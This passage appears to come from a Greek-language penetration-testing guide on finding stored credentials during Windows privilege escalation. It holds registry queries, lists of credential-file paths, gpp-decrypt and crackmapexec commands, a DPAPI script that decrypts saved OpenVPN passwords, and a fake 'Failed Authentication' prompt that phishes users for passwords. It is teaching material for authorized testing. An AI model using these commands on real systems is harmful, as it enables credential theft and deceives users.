Χρησιμοποιήστε το [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) για τη διαχείριση κωδικών πρόσβασης τοπικών administrator. Η αποθήκευσή τους σε directory ή σε Entra και οι έλεγχοι πρόσβασης διαφέρουν από ένα προσαρμοσμένο τοπικό datastore· αντίστοιχα, οι [ρόλοι Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) καθορίζουν αν ένας χρήστης datastore που έχει πιστοποιηθεί μπορεί να διαβάσει συγκεκριμένο index.

### Αρχεία plugin Java server και επαναχρησιμοποίηση διαπιστευτηρίων

Ορισμένα plugins Java server διανέμονται ως αρχεία JAR στον κατάλογο `plugins` ενός server. Ένα αναγνώσιμο προσαρμοσμένο plugin μπορεί να περιέχει ρυθμίσεις ή bytecode με ενσωματωμένο διαπιστευτήριο υπηρεσίας. Εξετάστε το αρχείο μόνο εφόσον υπάρχει εξουσιοδότηση και μην συμπεριλαμβάνετε ανακτημένα μυστικά στη συνήθη έξοδο απαρίθμησης. Μια διαδρομή plugin από μόνη της δεν αποδεικνύει ότι υπάρχει μυστικό, ενώ ένας ανακτημένος κωδικός πρόσβασης υπηρεσίας οδηγεί σε περισσότερα προνόμια μόνο αν είναι επίσης έγκυρος για λογαριασμό με περισσότερα προνόμια. Ελέγξτε τα σχετικά ACL αρχείων και αντικαταστήστε τους επαναχρησιμοποιούμενους κωδικούς με ξεχωριστά μυστικά. Δείτε τον [οδηγό εγκατάστασης plugin του PaperMC](https://docs.papermc.io/paper/adding-plugins/) για τη διάταξη καταλόγων και την [τεκμηρίωση JAR της Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) για τα περιεχόμενα των αρχείων.

### Διαπιστευτήρια ενσωματωμένης βάσης δεδομένων Openfire

Μια εγκατάσταση Openfire που χρησιμοποιεί την ενσωματωμένη βάση δεδομένων της μπορεί να διατηρεί το `openfire.script` στον φάκελο `Openfire\embedded-db`. Αν ο τρέχων λογαριασμός μπορεί να το διαβάσει, εξετάστε μαζί τις εγγραφές `OFUSER` και την ιδιότητα `passwordKey`. Η [τεκμηρίωση παρόχου χρηστών](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) του Openfire αναφέρει ότι οι κωδικοί πρόσβασης μπορούν να αποθηκεύονται σε απλό κείμενο ή να κρυπτογραφούνται με κλειδί που διατηρείται σε αυτήν την ιδιότητα. Ένας ανακτημένος κωδικός πρόσβασης έχει σημασία για κλιμάκωση μόνο αν εξακολουθεί να ισχύει για μια ταυτότητα με περισσότερα προνόμια· το όνομα αρχείου από μόνο του δεν αποδεικνύει ούτε πρόσβαση ανάγνωσης ούτε επαναχρησιμοποίηση διαπιστευτηρίων. Η διαδρομή αποτελεί ένδειξη για απογραφή, γι’ αυτό μην συμπεριλαμβάνετε περιεχόμενο βάσης δεδομένων και διαπιστευτήρια στη συνήθη έξοδο απαρίθμησης.

Το ξεχωριστό αρχείο `Openfire\conf\openfire.xml` μπορεί να αποκαλύψει τις ρυθμισμένες θύρες και τη διεπαφή bind της κονσόλας διαχείρισης, ακόμη κι όταν χρησιμοποιείται εξωτερική βάση δεδομένων. Το Openfire συνήθως κάνει bind την κονσόλα διαχείρισης στο loopback· αυτό εξακολουθεί να επιτρέπει σε έναν τοπικό λογαριασμό να προσεγγίσει τη διεύθυνση, αν ο listener λειτουργεί. Ελέγξτε μαζί τον πραγματικό listener, τον εξουσιοδοτημένο ρόλο admin, την πολιτική αποστολής plugin και την ταυτότητα υπηρεσίας Openfire. Ένας admin που μπορεί να εγκαταστήσει plugin ενδέχεται να προκαλέσει εκτέλεση κώδικα plugin στο context της υπηρεσίας, κάτι που μπορεί να συνεπάγεται υψηλά προνόμια όταν η υπηρεσία εκτελείται ως LocalSystem. Ένας κωδικός πρόσβασης που ταιριάζει ή μια αναγνώσιμη διαδρομή ρυθμίσεων από μόνα τους δεν αποδεικνύουν πρόσβαση στην κονσόλα διαχείρισης ή εκτέλεση κώδικα. Δείτε τον [οδηγό εγκατάστασης και διαχείρισης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) του προμηθευτή και την [ιδιότητα API αποστολής plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Ρυθμίσεις forensic management server

Οι ρυθμίσεις server του Velociraptor, που συνήθως ονομάζονται `server.config.yaml`, μπορεί να περιέχουν το `CA.private_key` της εσωτερικής CA. Αν ένας χρήστης με λιγότερα προνόμια μπορεί να διαβάσει αυτό το κλειδί, ενδέχεται να μπορεί να δημιουργήσει API client certificate. Το αν αυτό οδηγεί σε περισσότερα προνόμια εξαρτάται από τους ρόλους χρηστών του server, την προσβασιμότητα του API και την ταυτότητα με την οποία εκτελείται ο server ή ο agent-στόχος. Ένα client configuration περιέχει διαφορετικό υλικό· ο εντοπισμός του δεν αποδεικνύει πρόσβαση στην CA του server. Σε ορισμένες εγκαταστάσεις το ιδιωτικό κλειδί της CA διατηρείται εκτός σύνδεσης, οπότε μια αναγνώσιμη ρύθμιση server μπορεί επίσης να μην περιέχει το κλειδί υπογραφής.

Σε Windows server, ελέγξτε το ACL της ρύθμισης **server** στον κατάλογο εγκατάστασής του, καθώς και τυχόν προστατευμένα αντίγραφα ασφαλείας. Μια πιθανή τοποθεσία είναι `%ProgramFiles%\VelociraptorServer\server.config.yaml`· αν διαφέρει, χρησιμοποιήστε τη διαδρομή που έχει ρυθμιστεί για την υπηρεσία. Επιβεβαιώστε ότι η τρέχουσα ταυτότητα μπορεί να διαβάσει το αρχείο και ότι υπάρχει πράγματι το `CA.private_key`. Αποφύγετε την εμφάνιση του ιδιωτικού κλειδιού σε logs ή στην έξοδο απαρίθμησης. Η ροή εργασίας `config api_client` του προμηθευτή χρησιμοποιεί το κλειδί CA για την έκδοση client certificate, αλλά απαιτείται επίσης αποτελεσματικός ρόλος στην πλευρά του server· η δημιουργία ή η αλλαγή ενός τέτοιου ρόλου μπορεί να απαιτεί write access στο datastore ή επανεκκίνηση. Μια υπάρχουσα προνομιούχα ταυτότητα server ενδέχεται να προσφέρει οδό ακόμη και όταν αυτές οι εγγραφές δεν είναι διαθέσιμες. Τα API queries με δικαιώματα εκτέλεσης εκτελούνται στο σχετικό context του server ή του agent, το οποίο μπορεί να έχει υψηλά προνόμια.

Προστατεύστε τις ρυθμίσεις του server και τα αντίγραφα ασφαλείας με περιοριστικά ACL, διατηρήστε το κλειδί υπογραφής της CA εκτός σύνδεσης όπου είναι δυνατό και περιορίστε τους ρόλους API και την πρόσβαση στους listeners. Δείτε την [τεκμηρίωση API του Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) και τις [οδηγίες ρυθμίσεων ασφαλείας](https://docs.velociraptor.app/docs/deployment/security/).

### Διαπιστευτήρια Putty

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Το Solar-PuTTY είναι ξεχωριστός διαχειριστής συνεδριών. Η εγγενής κρυπτογραφημένη αποθήκη του μπορεί να βρίσκεται στη διαδρομή `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ενώ ένα εξαγόμενο αντίγραφο ασφαλείας συνεδριών μπορεί να ονομάζεται `sessions-backup.dat` και να είναι αποθηκευμένο αλλού. Ο [οδηγός εξαγωγής της SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) αναφέρει ότι οι εξαγωγές κρυπτογραφούνται με κωδικό πρόσβασης και μπορούν να περιλαμβάνουν συνεδρίες, κλειδιά, scripts, ετικέτες και συσχετίσεις. Το [φόρουμ υποστήριξής της](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) αναφέρει την εγγενή αποθήκη. Ελέγξτε πρώτα τα δικαιώματα αρχείων και τις διαδρομές. Η εύρεση οποιουδήποτε από τα δύο αρχεία δεν αποκαλύπτει τον κωδικό πρόσβασής του ούτε αποδεικνύει ότι οποιοδήποτε αποθηκευμένο διαπιστευτήριο εξακολουθεί να είναι έγκυρο ή να έχει αυξημένα δικαιώματα.

### Κλειδιά κεντρικού υπολογιστή SSH του PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Κλειδιά SSH στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκεύονται στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε ελέγξτε αν υπάρχει κάτι ενδιαφέρον εκεί:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Αν βρείτε κάποια εγγραφή μέσα σε αυτή τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα με το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Δοκίμασα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το μητρώο HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρο κλειδί.

### Αρχεία αυτόματης εγκατάστασης

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Περιεχόμενο παραδείγματος:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Αντίγραφα ασφαλείας των SAM και SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Τα αναγνώσιμα αρχεία αντιγράφων ασφαλείας Windows Imaging (`.wim`) μπορεί επίσης να περιέχουν offline hives `SAM`, `SECURITY` και `SYSTEM`. Δώστε προτεραιότητα σε τοπικά προσβάσιμους καταλόγους αντιγράφων ασφαλείας ή εικόνων και ελέγξτε τα **ονόματα των μελών** μιας εικόνας πριν εξαγάγετε οτιδήποτε· το όνομα αρχείου `.wim` από μόνο του δεν αποδεικνύει ότι εκτίθενται hives, ενώ οι συνηθισμένες εικόνες `install.wim`, `boot.wim` και αποκατάστασης συχνά αποτελούν παραπλανητικά ευρήματα. Ένα SMB share είναι ξεχωριστή οδός πρόσβασης και πρέπει να ελέγχεται μόνο όταν αυτό το share είναι εντός πεδίου. Δείτε τις οδηγίες της Microsoft για [εικόνες Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) και την [αναφορά αρχείων registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Διαπιστευτήρια Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Cached GPP Password

Παλαιότερα υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών administrator σε μια ομάδα μηχανημάτων μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), που αποθηκεύονταν ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα από οποιονδήποτε χρήστη του domain. Δεύτερον, οποιοσδήποτε πιστοποιημένος χρήστης μπορούσε να αποκρυπτογραφήσει τους κωδικούς πρόσβασης μέσα σε αυτά τα GPP, καθώς ήταν κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα δικαιώματα.

Για τον μετριασμό αυτού του κινδύνου, αναπτύχθηκε μια συνάρτηση που αναζητά τοπικά αποθηκευμένα αρχεία GPP τα οποία περιέχουν πεδίο "cpassword" με μη κενή τιμή. Όταν εντοπίζει ένα τέτοιο αρχείο, αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Το αντικείμενο αυτό περιλαμβάνει λεπτομέρειες σχετικά με το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε αυτά τα αρχεία στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Διαμόρφωση Web του IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Παράδειγμα web.config με διαπιστευτήρια:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Αντίγραφα ασφαλείας αρχειοθετημένα σε webroot του IIS

Ένα παλιό αντίγραφο ασφαλείας ZIP, τοποθετημένο απευθείας σε webroot που εξυπηρετείται από τον web server, ενδέχεται να εκθέσει παλαιότερα αρχεία ρυθμίσεων και επαναχρησιμοποιήσιμα διαπιστευτήρια. Ελέγξτε τη διαμορφωμένη φυσική διαδρομή του ιστότοπου και αν το αρχείο είναι πράγματι προσβάσιμο μέσω HTTP, πριν θεωρήσετε ότι υπάρχει έκθεση. Η προεπιλεγμένη διαδρομή `C:\inetpub\wwwroot` είναι απλώς μια πιθανή επιλογή. Μια γρήγορη τοπική απογραφή μπορεί να εμφανίσει ονόματα και μεγέθη χωρίς να ανοίξει τα αρχεία:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Το όνομα μιας αρχειοθήκης δεν αποδεικνύει ότι περιέχει κάποιο μυστικό ή ότι ένα ανακτημένο διαπιστευτήριο παρέχει υψηλότερα προνόμια.

### Διαπιστευτήρια OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Καταγραφές

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια κάποιου άλλου χρήστη**, αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να ζητάτε απευθείας από τον πελάτη τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που κάποια στιγμή περιείχαν **κωδικούς πρόσβασης** σε **απλό κείμενο** ή σε **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Οι βάσεις δεδομένων Password Safe v3 χρησιμοποιούν συνήθως την επέκταση `.psafe3`. Αντιμετωπίστε ένα αρχείο με αντίστοιχο όνομα ως πιθανό κρυπτογραφημένο vault· η παρουσία του δεν αποδεικνύει ότι μπορείτε να το διαβάσετε, να το ξεκλειδώσετε ή να χρησιμοποιήσετε τυχόν αποθηκευμένα διαπιστευτήρια. Κατά τον έλεγχο της αποθήκευσης τέτοιων αρχείων, ελέγξτε τα προσβάσιμα προφίλ χρηστών και τις διαμορφωμένες ρίζες κοινόχρηστων αρχείων.

Ένα αναγνώσιμο αρχείο KeePass `.kdbx` αποτελεί επίσης μόνο ένδειξη ύπαρξης κρυπτογραφημένου vault. Για να ξεκλειδωθεί, απαιτείται ο πραγματικός master-password και οποιοδήποτε διαμορφωμένο key-file ή άλλος παράγοντας λογαριασμού. Αν ένας εξουσιοδοτημένος έλεγχος εντοπίσει σε μια καταχώριση ζεύγος κατακερματισμών LM:NT, επαληθεύστε τον αναφερόμενο λογαριασμό και αν ο κατακερματισμός NT είναι τρέχων και γίνεται αποδεκτός από την υπηρεσία NTLM του στόχου, προτού εξετάσετε το ενδεχόμενο χρήσης [pass-the-hash](../ntlm/README.md#pass-the-hash). Μια καταχώριση σε vault δεν παρέχει από μόνη της δικαιώματα Administrator ή SYSTEM· πρέπει επίσης να ισχύουν η απομακρυσμένη πρόσβαση στην υπηρεσία, τα δικαιώματα του λογαριασμού και τυχόν ξεχωριστό βήμα εκτέλεσης υπηρεσίας. Η απογραφή πρέπει να αναφέρει τη διαδρομή του vault και αν είναι αναγνώσιμο, όχι να εκτυπώνει τη βάση δεδομένων ή τα αποθηκευμένα διαπιστευτήρια.

Αναζητήστε όλα τα προτεινόμενα αρχεία:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Ελέγξτε τις προσβάσιμες καταχωρίσεις του Κάδου Ανακύκλωσης για διαγραμμένα αντίγραφα ασφαλείας και αρχεία ρυθμίσεων, καθώς και για αρχεία των οποίων τα ονόματα αναφέρουν ρητά διαπιστευτήρια. Ένα χρήσιμο αντίγραφο ασφαλείας `.7z`, `.zip` ή `.rar` μπορεί να είναι μηνών και να έχει ένα συνηθισμένο όνομα αρχείου. Τα Windows αποθηκεύουν την αρχική διαδρομή και την ώρα διαγραφής σε μια εγγραφή `$I`, ενώ το διαγραμμένο αρχείο βρίσκεται στην αντίστοιχη καταχώριση `$R`· εξετάστε τα μεταδεδομένα και ελέγξτε αν η τρέχουσα ταυτότητα έχει δικαίωμα ανάγνωσης πριν ανοίξετε ένα αρχείο. Η ορατότητα εξαρτάται από τον τόμο, το SID του χρήστη και τα δικαιώματα αρχείων, επομένως μια κενή λίστα δεν αποδεικνύει ότι δεν υπάρχει ανακτήσιμο αντίγραφο ασφαλείας. Αντιμετωπίστε το όνομα ενός αρχείου ως υποψήφιο για έλεγχο, όχι ως απόδειξη ότι περιέχει έγκυρο μυστικό.

Ένα προσβάσιμο διαγραμμένο `.pfx` μπορεί επίσης να αποτελέσει ένδειξη για **υπογραφή κώδικα**. Αν περιέχει προσβάσιμο ιδιωτικό κλειδί, το κλειδί μπορεί να υπογράψει ένα τροποποιημένο PowerShell script· [το PowerShell απαιτεί πιστοποιητικό υπογραφής κώδικα με ιδιωτικό κλειδί](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), ενώ [οι κανόνες εκδότη του AppLocker αξιολογούν την ταυτότητα του υπογράφοντος και το πεδίο εφαρμογής του κανόνα](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Η εκτέλεση από διαφορετικό λογαριασμό απαιτεί η τρέχουσα ταυτότητα να μπορεί να τροποποιήσει το συγκεκριμένο script, να υπάρχει ενεργός κανόνας που αποδέχεται την υπογραφή που θα προκύψει για το script και τον λογαριασμό-στόχο, καθώς και μια προγραμματισμένη εργασία ή άλλη διεργασία με υψηλότερα δικαιώματα που πράγματι το εκτελεί. Το όνομα αρχείου `.pfx`, το θέμα του πιστοποιητικού ή ένα script με δυνατότητα εγγραφής δεν αποδεικνύουν από μόνα τους ότι ισχύει αυτή η αλυσίδα. Ελέγξτε τα μεταδεδομένα, τις ACL, την πολιτική και την προγραμματισμένη εντολή πριν ανοίξετε υλικό ιδιωτικού κλειδιού ή ενεργοποιήσετε την εργασία.

Ελέγξτε επίσης προσβάσιμες βάσεις δεδομένων προφίλ εφαρμογών ανταλλαγής μηνυμάτων, σημειώσεις και ληφθέντα αρχεία για ενδείξεις διαπιστευτηρίων. Μια εξαγωγή κλειδιού ανάκτησης BitLocker μπορεί να είναι αποθηκευμένη ως HTML ή TXT, μερικές φορές μέσα σε ένα επώνυμο αντίγραφο ασφαλείας. Αυτό το υλικό μπορεί να παρέχει πρόσβαση σε ξεχωριστό κρυπτογραφημένο τόμο δεδομένων που περιέχει παλαιότερα αντίγραφα ασφαλείας· εξετάστε τον τόμο και το αρχείο μόνο εφόσον έχετε εξουσιοδότηση. Αν ένα αντίγραφο ασφαλείας περιλαμβάνει το `NTDS.dit`, η ανάκτηση διαπιστευτηρίων τομέα offline απαιτεί επίσης την αντίστοιχη κυψέλη `SYSTEM`, όπως περιγράφεται στη [ροή εργασίας αντιγράφων ασφαλείας και προνομιούχων ομάδων](../active-directory-methodology/privileged-groups-and-token-privileges.md). Τα ονόματα αρχείων και ένας κλειδωμένος τόμος από μόνα τους δεν αποδεικνύουν ότι υπάρχει αξιοποιήσιμο κλειδί ανάκτησης ή αντίγραφο ασφαλείας τομέα.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά κλειδιά registry με διαπιστευτήρια**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Εξαγωγή κλειδιών OpenSSH από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό browser

Θα πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από το **Chrome, το Edge ή το Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των browser, καθώς ενδέχεται να είναι αποθηκευμένοι εκεί κάποιοι **κωδικοί πρόσβασης**.

Για το συμβατικό προφίλ **Default** του Edge του τρέχοντος χρήστη, το `Login Data` βρίσκεται στο `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ενώ το `Local State` βρίσκεται στον γονικό κατάλογο `User Data`. [Η Microsoft τεκμηριώνει την προεπιλεγμένη θέση του προφίλ](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)· ένα άλλο προφίλ ή μια πολιτική `UserDataDir` μπορεί να αλλάξει τη θέση του. Η παρουσία των αρχείων αποτελεί μόνο ένδειξη για την ύπαρξη αποθήκης διαπιστευτηρίων: επιβεβαιώστε ότι τα αρχεία είναι αναγνώσιμα, ότι διαθέτετε το πλαίσιο DPAPI του αντίστοιχου χρήστη ή άλλο εξουσιοδοτημένο υλικό κλειδιών και αν κάποια αποθηκευμένη σύνδεση ανήκει σε λογαριασμό με υψηλότερα προνόμια. Η απλή απαρίθμηση διαδρομών δεν απαιτεί το άνοιγμα της βάσης δεδομένων ή την εμφάνιση αποκρυπτογραφημένων κωδικών πρόσβασης.

